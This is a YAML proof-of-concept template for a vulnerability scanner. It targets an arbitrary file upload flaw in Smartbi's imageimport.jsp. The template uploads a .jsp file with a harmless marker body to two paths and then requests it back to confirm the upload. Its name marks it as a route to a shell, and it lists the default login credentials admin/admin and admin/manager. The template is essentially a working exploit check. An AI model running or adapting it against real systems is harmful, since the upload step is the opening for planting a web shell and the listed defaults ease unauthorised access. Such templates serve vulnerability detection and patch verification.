name: poc-yaml-smartbi-fileupload-getshell
binding: 128628c4-0cc7-423d-9e3d-709ad8ca5838
manual: true
detail:
    author: secking
    links:
        - https://mp.weixin.qq.com/s/yeMhVYJks_wf6Po-sA6iOg
    vulnerability:
        id: CT-529832
        level: high
    description: smartbi imageimport.jsp任意文件上传
    info: 需系统配置账户登录Basic认证（默认密码admin/admin,admin/manager）
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    num: randomLowercase(5)
    md5num: md5(num)
    rboundary: randomInt(40000000000000, 50000000000000)
rules:
    r0:
        request:
            cache: false
            method: POST
            path: /vision/designer/imageimport.jsp
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
                X-File-Name: a{{num}}.jsp
                X-File-Type: image
            body: a{{md5num}}
        expression: response.status == 200 && response.content_type.contains("html") && response.body.ibcontains(bytes('"url":"images')) && response.body.bcontains(bytes("dir")) && response.body.bcontains(bytes(num))
    r1:
        request:
            cache: false
            method: GET
            path: /vision/designer/images/a{{num}}.jsp
        expression: response.status == 200 && response.body.ibcontains(bytes(md5num))
    r2:
        request:
            cache: false
            method: POST
            path: /smartbi/vision/designer/imageimport.jsp
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
                X-File-Name: a{{num}}.jsp
                X-File-Type: image
            body: a{{md5num}}
        expression: response.status == 200 && response.content_type.contains("html") && response.body.ibcontains(bytes('"url":"images')) && response.body.bcontains(bytes("dir")) && response.body.bcontains(bytes(num))
    r3:
        request:
            cache: false
            method: GET
            path: /smartbi/vision/designer/images/a{{num}}.jsp
        expression: response.status == 200 && response.body.ibcontains(bytes(md5num))
expression: r0() && r1() || r2() && r3()
